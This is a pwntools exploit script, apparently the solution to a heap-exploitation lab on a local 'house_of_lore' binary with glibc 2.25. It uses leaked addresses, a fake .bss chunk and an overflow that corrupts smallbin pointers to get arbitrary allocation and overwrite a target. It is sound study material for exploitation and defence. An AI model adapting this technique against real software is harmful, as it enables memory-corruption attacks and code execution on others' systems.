from pwn import *
r = process("./house_of_lore")
libc = ELF("../.glibc/glibc_2.25/libc.so.6")
index = 0

def malloc(size):
    global index
    r.send(b"1")
    r.sendafter(b"size: ", str(size).encode())
    r.recvuntil(b"> ")
    index += 1
    return index - 1

def free(index):
    r.send(b"2")
    r.sendafter(b"index: ",str(index).encode())
    r.recvuntil(b"> ")

def edit(index, data):
    r.send(b"3")
    r.sendafter(b"index: ", str(index).encode())
    r.sendafter(b"data: ", data)
    r.recvuntil(b"> ")

r.recvuntil(b"@ ")
libc.address =  int(r.recvline().strip(),16) -  0x68d70
print(hex(libc.address))

r.recvuntil(b"@ ")
heap = int(r.recvline().strip(),16)
print(hex(heap))

# fake_chunk in .bss
# fake_chunk->fd = B
# fake_chunk->bk = A
r.sendafter(b"username:",p64(0) + p64(0xa0) + p64(heap + 0xa0) + p64(heap))

# Allocate victim chunk (0x98 gets aligned to 0xa0 with 0x90 bytes for data, 8 bytes overflow!)
A = malloc(0x98)

# Guard chunk to avoid that A merges with top chunk
B = malloc(0x88)

# Bypass "smallbin double linked list corrupted"
edit(B, p64(0x602010))

# Put A in the unsortedbin
free(A)

# A->bk = fake_chunk
edit(A, p64(0) + p64(0x602010))

# Forcing A to be inserted in a smallbin
C = malloc(0x400)

D = malloc(0x98)

# Alloc fake_chunk
E = malloc(0x98)

# Overwrite target
edit(E, b"A" * 0x20 + b"_s1s1fo_")

r.sendline(b"4")

r.interactive()
